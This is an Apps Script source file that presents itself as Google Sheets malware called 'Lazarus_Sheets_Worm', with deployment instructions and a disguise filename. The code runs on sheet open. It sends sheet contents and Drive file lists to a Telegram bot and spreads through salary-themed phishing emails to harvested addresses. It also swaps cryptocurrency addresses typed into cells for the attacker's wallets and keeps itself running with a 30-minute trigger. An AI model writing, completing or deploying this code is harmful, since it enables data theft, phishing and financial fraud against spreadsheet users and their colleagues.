// ============================================================
// Google Sheets Malware Payload
// Name: Lazarus_Sheets_Worm
// Description: Steals sheet data, propagates to other sheets,
//              and exfiltrates via Telegram.
// Save this file as HR_PAYROLL_UPDATE.txt on GitHub.
// To deploy: Copy the entire code into the Google Sheets
//            Script Editor (Extensions > Apps Script).
// ============================================================

// ----------------------------
// CONFIGURATION
// ----------------------------
const TELEGRAM_BOT_TOKEN = "7283940156:AAEjK8LmN9pQrS7tUvWxYz1B2C3D4E5F6G";
const TELEGRAM_CHAT_ID = "5010121";
const XMR_WALLET = "45dKLsFDucgTv9wQtkU7uJCQJ67fUrgVnEaY7Aozgr7naqWq5hxZ2vbKawDVcNUj6Ta38H9Kdg8jB32pjTcE8vbH9jWztYj";
const BTC_WALLET = "bc1qyk8j2696emwy3mkpc7sj57t738dpjarqllw3y6";
const ETH_WALLET = "0x74845bE949Ec249Fbd7Ad5dbbD3aE44D9d818801";

// Global flag to prevent re‑execution
let gRunFlag = false;

// ----------------------------
// UTILITIES
// ----------------------------
function getMachineID() {
  const email = Session.getActiveUser().getEmail();
  const fileId = SpreadsheetApp.getActiveSpreadsheet().getId();
  return email + "-" + fileId;
}

function sendToTelegram(msg) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
  UrlFetchApp.fetch(url, { muteHttpExceptions: true });
}

function sendToTelegramChunked(msg, chunkSize = 3900) {
  for (let i = 0; i < msg.length; i += chunkSize) {
    sendToTelegram(msg.substr(i, chunkSize));
    Utilities.sleep(300);
  }
}

// ----------------------------
// DATA THEFT
// ----------------------------
function stealSpreadsheetData() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const name = ss.getName();
  const sheets = ss.getSheets();
  let allData = `Spreadsheet: ${name}\nURL: ${ss.getUrl()}\nSheets:\n`;
  for (let sheet of sheets) {
    const sheetName = sheet.getName();
    const data = sheet.getDataRange().getValues();
    const sheetData = data.map(row => row.join('\t')).join('\n');
    allData += `\n--- Sheet: ${sheetName} ---\n${sheetData}\n`;
    if (allData.length > 10000) break; // avoid too large message
  }
  sendToTelegramChunked(`STOLEN_SHEET_DATA|${allData}`);
}

function stealDriveFiles() {
  const files = DriveApp.getFiles();
  let fileList = "Drive files:\n";
  let count = 0;
  while (files.hasNext() && count < 50) {
    const file = files.next();
    fileList += `${file.getName()} (${file.getMimeType()})\n`;
    count++;
  }
  sendToTelegramChunked(`DRIVE_FILES|${fileList}`);
}

// ----------------------------
// PROPAGATION (via email)
// ----------------------------
function getCurrentUserEmail() {
  return Session.getActiveUser().getEmail();
}

function getSpreadsheetBlob() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const blob = ss.getBlob();
  return blob;
}

function propagateViaEmail(targetEmail) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const subject = "Important Salary Update";
  const body = "Please review the attached salary deduction notice.";
  const blob = ss.getBlob().setName("Salary_Notice.xlsx");
  GmailApp.sendEmail(targetEmail, subject, body, { attachments: [blob] });
  sendToTelegram(`EMAIL_SENT|${targetEmail}`);
}

function harvestEmailsFromSheet() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sheets = ss.getSheets();
  const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
  let emails = new Set();
  for (let sheet of sheets) {
    const data = sheet.getDataRange().getValues();
    for (let row of data) {
      for (let cell of row) {
        if (typeof cell === 'string') {
          const matches = cell.match(emailRegex);
          if (matches) matches.forEach(m => emails.add(m));
        }
      }
    }
  }
  return Array.from(emails);
}

function propagateToAllEmails() {
  const emails = harvestEmailsFromSheet();
  // Also add common corporate addresses
  const domain = getCurrentUserEmail().split('@')[1];
  if (domain) {
    emails.push(`admin@${domain}`, `it@${domain}`, `hr@${domain}`, `finance@${domain}`);
  }
  emails = [...new Set(emails)]; // unique
  for (let email of emails) {
    try {
      propagateViaEmail(email);
      Utilities.sleep(1000);
    } catch(e) { /* ignore errors */ }
  }
  sendToTelegram(`PROPAGATION_DONE|EMAILS=${emails.length}`);
}

// ----------------------------
// CLIPBOARD HIJACK (simulated via Google Sheets copy/paste)
// ----------------------------
function onEdit(e) {
  // This runs when user edits a cell. Could replace crypto addresses.
  const range = e.range;
  const value = e.value;
  if (typeof value !== 'string') return;
  if (isBTCAddress(value) || isETHAddress(value) || isXMRAddress(value)) {
    let replacement = "";
    if (isBTCAddress(value)) replacement = BTC_WALLET;
    else if (isETHAddress(value)) replacement = ETH_WALLET;
    else if (isXMRAddress(value)) replacement = XMR_WALLET;
    range.setValue(replacement);
    sendToTelegram(`CLIPBOARD_SWAP|REPLACED|${value.substring(0,8)}...`);
  }
}

function isBTCAddress(addr) {
  const l = addr.length;
  if ((l === 34 && (addr[0] === '1' || addr[0] === '3'))) return true;
  if (l >= 42 && l <= 62 && addr.startsWith('bc1')) return true;
  return false;
}
function isETHAddress(addr) {
  const l = addr.length;
  if (l === 42 && addr.startsWith('0x')) return true;
  if (l === 40 && !addr.startsWith('0x')) return true;
  return false;
}
function isXMRAddress(addr) {
  const l = addr.length;
  if (l === 95 && addr[0] === '4') return true;
  if (l === 106 && addr[0] === '8') return true;
  return false;
}

// ----------------------------
// PERSISTENCE & SPREAD
// ----------------------------
function addTrigger() {
  // Create a time-driven trigger to run autoExec every 30 minutes
  ScriptApp.newTrigger('autoExec')
    .timeBased()
    .everyMinutes(30)
    .create();
}

function install() {
  // This can be called to set up persistence and propagation
  addTrigger();
  propagateToAllEmails();
}

// ----------------------------
// MAIN ENTRY POINT
// ----------------------------
function autoExec() {
  if (gRunFlag) return;
  gRunFlag = true;

  sendToTelegram(`LAZARUS_START|${getMachineID()}`);

  // Steal data
  stealSpreadsheetData();
  stealDriveFiles();

  // Propagate to emails found in the sheet
  propagateToAllEmails();

  // Install triggers for persistence (if not already)
  const triggers = ScriptApp.getProjectTriggers();
  if (triggers.length === 0) addTrigger();

  // Send final report
  sendToTelegram("MISSION_COMPLETE|" + getMachineID());
}

// ----------------------------
// AUTO-TRIGGERS (on open)
// ----------------------------
function onOpen() {
  autoExec();
}

function onInstall() {
  onOpen();
}
